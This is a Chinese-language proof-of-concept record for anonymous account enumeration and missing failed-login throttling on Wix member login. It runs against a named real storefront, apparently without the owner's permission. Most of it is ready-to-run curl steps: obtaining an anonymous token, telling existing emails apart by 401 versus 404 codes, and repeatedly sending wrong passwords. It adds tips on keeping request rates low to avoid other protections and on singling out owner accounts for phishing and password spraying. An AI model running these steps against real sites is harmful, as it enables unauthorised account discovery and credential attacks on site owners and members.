# Wix 会员登录端点 /_api/wix-sm-webapp/v1/auth/login 匿名账号枚举（401 -19976 vs 404 -19999）+ 无有效失败节流

- **code**: wix-sm-webapp-auth-login-account-enum-no-throttle
- **kind**: poc
- **category**: info-leak
- **component**: Wix / Wix Velo（wix-sm-webapp 会员登录 + /_api/v1/access-tokens）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#10 / finding_id=138（finding_checks.verdict=verified，status=confirmed），2026-11-11，本机 curl/python 直连 www.kennysbuyselltrade.co.uk：① 匿名 GET /_api/v1/access-tokens → 200（175332B），apps['675bbcef-18d8-41f5-800e-131ec9e08762'].instance 作为 Authorization；② POST /_api/wix-sm-webapp/v1/auth/login 已注册邮箱 + 错误口令 → 401 {"message":"authentication failed (-19976)"}；不存在邮箱 zzz.control.9137@example.org → 404 {"message":"member with email [...] was not found (-19999)"}；③ 对已注册邮箱连续 10 次错误口令（0.15s 间隔）+ 此前 28 次（0.8-1.5s 间隔）→ 全部 401，无 429/无锁定；④ 对照 GET /_api/wix-sm-webapp/v1/members/<id> 带同一匿名令牌 → 200 role=OWNER（佐证已注册邮箱对应站点业主）。判定：401/404 二分构成稳定账号枚举 oracle，且失败尝试无有效节流，具备在线口令验证条件。
- **path**: pocs/wix-sm-webapp-auth-login-account-enum-no-throttle/wix_sm_webapp_login_enum_no_throttle.md
- **tags**: wix, velo, wix-sm-webapp, account-enumeration, login-oracle, no-ratelimit, credential-testing
- **created_at**: 2026-11-11T17:52:29.278Z
- **engine**: https://www.kennysbuyselltrade.co.uk

## 描述

Wix 站点的会员登录端点 POST /_api/wix-sm-webapp/v1/auth/login 用公开匿名 app-instance 令牌即可访问（令牌来自 /_api/v1/access-tokens，无需登录）。对已注册邮箱返回 401 authentication failed (-19976)，对不存在邮箱返回 404 member with email [...] was not found (-19999)，构成确定可复现的账号枚举 oracle；且对有效邮箱连续 38 次错误口令全程无 429/锁定，等于开放无节流的口令强度验证面（仅空 body 会触发 LoginUserBasedThrottler）。可精确枚举站点会员/业主账号并做在线凭据复用验证。

## 用法

```
1) 匿名取令牌：curl -s -A "$UA" https://<storefront>/_api/v1/access-tokens -o at.json → apps['675bbcef-18d8-41f5-800e-131ec9e08762'].instance（Velo/wix-sm-webapp 实例）；缺 Authorization 头回 400 missing_context。
2) 枚举：POST /_api/wix-sm-webapp/v1/auth/login，头 Authorization: <instance> + Content-Type: application/json，body {"email":"<probe>","password":"WrongPass123!"}。401/-19976 = 账号存在（仅口令错）；404/-19999 = 不存在。批量跑邮箱清单即可。
3) 节流判据：对存在邮箱连续错误口令（含 0.15s 连发）全部 401、无 429/无锁定 → 可继续做口令强度验证（控制速率，避免把 Wix 侧其它防护打出来）。
4) 注意：空 body 会触发 LoginUserBasedThrottler，可能造成“有节流”的假象；必须用完整 JSON。目标未启用 Velo 会员登录时端点 404。
```

## 正文

```
# Wix 会员登录端点 /_api/wix-sm-webapp/v1/auth/login：匿名账号枚举 + 无有效失败节流

## 前置条件
- 目标为 Wix 托管站并启用了 Wix Members / Velo 会员登录（前端调用 `/_api/wix-sm-webapp/v1/auth/login`）。
- 无需账号。先匿名取应用实例令牌：
```bash
curl -s -A "$UA" "https://<storefront>/_api/v1/access-tokens" -o at.json
# 200，apps["675bbcef-18d8-41f5-800e-131ec9e08762"].instance（Velo / wix-sm-webapp 实例令牌）
# 缺 Authorization 头会回 400 missing_context
```

## 1) 账号存在性 oracle
```bash
# 1.1 已注册邮箱（进入口令校验阶段）
curl -sk -A "$UA" -X POST "https://<storefront>/_api/wix-sm-webapp/v1/auth/login" \
  -H "Authorization: <instance-token>" -H 'Content-Type: application/json' \
  --data '{"email":"<known-member>@example.com","password":"WrongPass123!"}'
# 期望：HTTP 401
# {"message":"authentication failed (-19976)","details":{"applicationError":{"code":"-19976","description":"authentication failed (-19976)"}}}

# 1.2 不存在邮箱
curl -sk -A "$UA" -X POST "https://<storefront>/_api/wix-sm-webapp/v1/auth/login" \
  -H "Authorization: <instance-token>" -H 'Content-Type: application/json' \
  --data '{"email":"zzz.control.<rand>@example.org","password":"WrongPass123!"}'
# 期望：HTTP 404
# {"message":"member with email [zzz.control.<rand>@example.org] was not found (-19999)","details":{"applicationError":{"code":"-19999"}}}
```
判据：**401 / -19976 = 账号存在；404 / -19999 = 账号不存在**。二分稳定，可批量枚举。

## 2) 失败节流测试
- 对同一存在邮箱连续提交错误口令（10 次、间隔 0.15s，另加 28 次 0.8–1.5s 间隔）；
- 全部 401，无 429 / 无锁定 → 具备在线口令强度验证条件；
- 注意：**空 body 会触发 LoginUserBasedThrottler**，可能造成“有节流”的假象；必须用完整 JSON 测试。

## 3) 佐证账号价值（可选）
```bash
curl -sk -A "$UA" "https://<storefront>/_api/wix-sm-webapp/v1/members/<member-id>" \
  -H "Authorization: <instance-token>"
# 200，role=OWNER 等字段（同一匿名令牌即可）——用于指认业主/高价值账号
```

## 影响
- 精确枚举站点会员/业主账号 → 定向钓鱼与口令喷洒；
- 无有效失败节流 → 可对已知账号做在线凭据复用验证。

## 失败常见原因
- 不带 Authorization 或令牌不属于该 app → 400 missing_context / 其它错误；
- 目标未启用 Velo 会员登录 → 端点 404；
- Wix 侧按站点/应用开关触发 429 → 降低速率或换时段（本目标实测 38 次未触发）；
- 用空 body 或畸形 JSON 测试 → 被 throttler 拦截，误判为有节流。
```
